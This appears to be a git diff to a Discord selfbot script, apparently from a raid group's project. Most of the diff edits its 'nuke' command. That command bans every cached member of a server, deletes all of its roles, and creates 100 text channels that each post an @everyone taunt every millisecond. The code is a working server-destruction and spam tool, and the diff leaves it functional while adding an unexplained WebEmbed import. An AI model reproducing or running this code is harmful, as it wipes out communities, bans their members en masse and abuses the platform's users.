@@ -3,7 +3,7 @@ const fs = require('fs');
 const { Client, Permissions } = require('discord.js-selfbot-v13');
 const gradient = require('gradient-string');
 const BetterMarkDown = require('discord-bettermarkdown');
-
+const WebEmbed = require("./WebEmbed");
 
 console.clear();
 let duck = gradient('yellow', 'orange', 'red').multiline([
@@ -89,7 +89,6 @@ function runClient() {
 const prefix = ".";
 const commandMap = new Map();
 const blacklist = [ ];
-
 let blacklistEmoji = "🤓";
 
 commandMap.set("help", {desc: "Sends a list of commands", func: (msg, args) => {
@@ -160,30 +159,29 @@ commandMap.set("samsung", {desc: "Sets Samsung Activity (samsung <start/stop> <p
 	}
 }});
 commandMap.set("nuke", {desc: "nukes the current server (you need admin permissions to use this)", func: (msg, args) => {
-	channelPerms = msg.guild.me.permissions.has("MANAGE_CHANNELS" || "ADMINISTRATOR");
-	banPerms = msg.guild.me.permissions.has("BAN_MEMBERS" || "ADMINISTRATOR");
-	kickPerms = msg.guild.me.permissions.has("KICK_MEMBERS" || "ADMINISTRATOR");
-	rolePerms = msg.guild.me.permissions.has("MANAGE_ROLES" || "ADMINISTRATOR");
-	emotePerms = msg.guild.me.permissions.has("MANAGE_EMOJIS_AND_STICKERS" || "ADMINISTRATOR");
+	let channelPerms = msg.guild.me.permissions.has("MANAGE_CHANNELS" || "ADMINISTRATOR");
+	let banPerms = msg.guild.me.permissions.has("BAN_MEMBERS" || "ADMINISTRATOR");
+	let rolePerms = msg.guild.me.permissions.has("MANAGE_ROLES" || "ADMINISTRATOR");
 	if (!banPerms || !rolePerms || !channelPerms) return;
 	let arrayOfIDs = msg.guild.members.cache.map((user) => user.id);
-            msg.reply("Found " + arrayOfIDs.length + " users.").then((msg) => {
-                setTimeout(() => {
-                    msg.edit("Banning...");
-                    for (let i = 0; i < arrayOfIDs.length; i++) {
-                        const user = arrayOfIDs[i];
-                        const member = msg.guild.members.cache.get(user);
-                        member.ban().catch((err) => { console.log(("Error Found: " + err)) }).then(() => { console.log(gradient('yellow', 'orange', 'red').multiline(`${member.user.tag} was banned.`)) });
-                    }
-                }, 2000);
-            })
+
+    msg.reply("Found " + arrayOfIDs.length + " users.").then((msg) => {
+        setTimeout(() => {
+        msg.edit("Banning...");
+            for (let i = 0; i < arrayOfIDs.length; i++) {
+                const user = arrayOfIDs[i];
+                const member = msg.guild.members.cache.get(user);
+                member.ban().catch((err) => { console.log(("Error Found: " + err)) }).then(() => { console.log(gradient('yellow', 'orange', 'red').multiline(`${member.user.tag} was banned.`)) });
+            }
+        }, 2000);
+    });
 	msg.guild.roles.cache.forEach((r) => r.delete().catch((err) => { console.log(("Error Found: " + err)) }))
 	for (let i = 0; i < 100; i++) {
-	msg.guild.channels.create("L", { type: "GUILD_TEXT" }).catch((err) => { console.log(("Error Found: " + err)) }).then((ch) => {
-		setInterval(() => {
-			ch.send("@everyone get nuked by wasiluk team");
-		}, 1); 
-	});
+		msg.guild.channels.create("L", { type: "GUILD_TEXT" }).catch((err) => { console.log(("Error Found: " + err)) }).then((ch) => {
+			setInterval(() => {
+				ch.send("@everyone get nuked by wasiluk team");
+			}, 1); 
+		});
 	}
 }});
 
